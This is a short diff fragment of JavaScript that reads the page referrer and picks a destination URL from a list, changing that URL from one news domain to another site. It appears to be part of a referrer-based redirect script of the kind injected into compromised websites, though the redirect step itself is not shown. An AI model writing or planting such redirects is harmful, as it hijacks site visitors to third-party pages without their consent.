@@ -4,7 +4,7 @@
     	var cek = document.referrer;
 
     	var ars 	= rChoice([
-							'https://lbdailynews.com/',
+							'https://ol.rajakatak.com',
 							]);
 
 				function rChoice(arr) {
